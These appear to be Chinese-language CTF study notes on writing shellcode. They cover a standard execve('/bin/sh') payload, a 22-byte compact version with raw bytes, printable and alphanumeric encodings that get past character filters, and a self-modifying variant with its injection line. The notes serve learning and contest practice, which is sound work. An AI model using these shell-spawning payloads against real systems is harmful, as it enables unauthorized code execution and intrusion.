# shellcode

其实想要做的是代码注入总结篇

## 基础shellcode的书写

要做shellcode，认为有下面几点要解决：

- 一般情况下需要相应内存块至少有可执行权限，如果没有的话看看有没有`mprotect`函数，可以进行一个权限申请
- 需要知道写入地址，或者让寄存器指向写入的代码块

### 直接pwntools生成

```assembly
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push b'/bin///sh\x00' */
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    /* push argument array ['sh\x00'] */
    /* push b'sh\x00' */
    push 0x1010101 ^ 0x6873
    xor dword ptr [rsp], 0x1010101
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    push 8
    pop rsi
    add rsi, rsp
    push rsi /* 'sh\x00' */
    mov rsi, rsp
    xor edx, edx /* 0 */
    /* call execve() */
    push SYS_execve /* 0x3b */
    pop rax
    syscall
```

这里将`/bin/sh`直接压入栈中，然后利用rsp的偏移获取地址，直接生成`shellcraft.sh()`生成即可，不做过多介绍

### 限制长度的shellcode（x86)

```assembly
xor rsi,rsi
push rsi
mov rdi, 0x68732f2f6e69622f
push rdi
push rsp
pop	 rdi
mov  al, 59
cdq
syscall
```

总长度为22（0x16)字节，实现的是`execve('/bin/sh','sh',0)`，构造出来的条件是这样的：

- rax:0x3b
- rdi:’/bin/sh’
- rsi:’sh’
- rdx:NULL

但是注意，需要eax的高二位为0(一般没什么问题)

bytes形式：

```assembly
\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05
```

可见字符形式(AE64生成)：

*关于ae64,直接看[这里](https://github.com/veritas501/ae64)就可以*

```assembly
WTYH39Yj3TYfi9WmWZj8TYfi9JBWAXjKTYfi9kCWAYjCTYfi93iWAZjrTYfi9h10t830T840T880T890t8A0T8B0T8CRAPZ0t80ZjBTYfi9O60t810T82RAPZ0T80ZH1vVHwzbinzzshWToxnQZP
```

**当然，出题人可能会通过一定的构造来要求更小字节的shellcode，主要就是对栈的理解（其实就是考察汇编功底）**

> 例如tgctf2025的shellcode，[这里](https://github.com/maple-pwn/for_fresher/blob/main/pwn/wp/tgctf/wp.md)

### 字符限制shellcode

一般会出现过滤掉某些特定字符，这时候可以用**自改变shellcode**或者**某些纯字母的shellcode**

纯字母（这里用的是[V3rdant的shellcode](https://v3rdant.cn/Pwn.Stack-Overflow-Overview/#shellcode%E7%9A%84%E4%B9%A6%E5%86%99)）

```assembly
// ref: https://hama.hatenadiary.jp/entry/2017/04/04/190129
/* from call rax */
push rax
push rax
pop rcx

/* XOR pop rsi, pop rdi, syscall */
push 0x41413030
pop rax
xor DWORD PTR [rcx+0x30], eax

/* XOR /bin/sh */
push 0x34303041
pop rax
xor DWORD PTR [rcx+0x34], eax
push 0x41303041
pop rax
xor DWORD PTR [rcx+0x38], eax

/* rdi = &'/bin/sh' */
push rcx
pop rax
xor al, 0x34
push rax

/* rdx = 0 */
push 0x30
pop rax
xor al, 0x30
push rax
pop rdx

push rax

/* rax = 59 (SYS_execve) */
push 0x41
pop rax
xor al, 0x7a

/* pop rsi, pop rdi*/
/* syscall */ 
.byte 0x6e
.byte 0x6f
.byte 0x4e
.byte 0x44

/* /bin/sh */
.byte 0x6e
.byte 0x52
.byte 0x59
.byte 0x5a
.byte 0x6e
.byte 0x43
.byte 0x5a
.byte 0x41
```

这一段shellcode可以绕过`\x05\x0f`的过滤，但是注意这里需要由`call rax`启动

**自改变shellcode**（这里用的whuctf2025中shell_for_shell）

```assembly
	mov si, word ptr [r15 + 0x100]	;r15的值+0x100，赋给si（rsi，16位模式)
    add si, 0x101					;再将si加上0x101
    mov word ptr [r15 + 0x100], si	;修改后的si存给r15+0x100的内存位置
    /*这里是为了给后面syscall找个确定位置，顺便自加一*/
    push 0x68						;压入"h"
    mov rax, 0x732f2f2f6e69622f		;压入/bin///s到rax中
    push rax						;压入rax中的值
    mov rdi, rsp					;栈顶指针给rdi，作为路径字符串的地址，后面直接写入execve

    push 0x1010101 ^ 0x6873			;异或的值压栈，避免显式空字节
    xor dword ptr [rsp], 0x1010101	;异或解密栈顶4字节，得到'sh\x00'
    xor esi, esi /* 0 */
    push rsi 						;作为字符串的\x00
    push 8							;压入8，后面计算‘sh\x00'字符串地址用
    pop rsi							;将8弹给rsi
    add rsi, rsp					;rsi=8+rsp，指向'sh\x00'
    push rsi 						;压入sh\x00
    mov rsi, rsp
    xor edx, edx /* 0 */
    /* call execve() */
    push SYS_execve 				;等价于push 0x3b
    pop rax							;弹给rax
```

注入时

```python
payload = (b"\x00\xc0"+asm(shellcode)).ljust(0x100-3, b"\x90")+b"\x0e\x04"
```

详细解释见